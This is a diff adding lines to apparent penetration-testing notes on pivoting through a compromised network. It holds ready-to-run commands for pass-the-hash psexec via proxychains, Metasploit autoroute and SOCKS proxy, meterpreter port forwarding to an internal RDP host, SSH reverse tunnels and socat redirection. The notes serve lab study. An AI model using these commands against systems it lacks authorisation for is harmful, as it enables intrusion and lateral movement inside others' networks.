@@ -34,10 +34,27 @@ proxychains -q python examples/psexec.py Administrator@172.16.184.151 -hashes aa
 use multi/manage/autoroute
 set session 2
 exploit
-
 use auxiliary/server/socks_proxy
 run
 # add "socks5 127.0.0.1 1080" to /etc/proxychains.conf
+
+# SOCKS5 using SSH
+ssh -R 8888 root@192.168.45.229
+
+# Port forwarding using meterpreter:
+portfwd add -l 3389 -p 3389 -r 172.16.176.194
+
+# Port forwarding using SSH:
+# https://gist.github.com/billautomata/ee0572113e1496a75b03
+# First, edit the GatewayPorts setting in /etc/ssh/sshd_config and restart SSH
+# Open 443 port on Kali and forward all connections to 192.168.45.234:443
+ssh -i id_rsa -R 0.0.0.0:443:192.168.45.234:443 root@Kali
+
+# Port forwarding using socat
+# https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/
+# All connections to 443 will be redirected to 
+socat TCP-LISTEN:443,fork TCP:192.168.45.234:443
+
 # NMAP using proxychains
 proxychains nmap -sT -PN -n -sV 172.16.167.187 -p 445
 ```
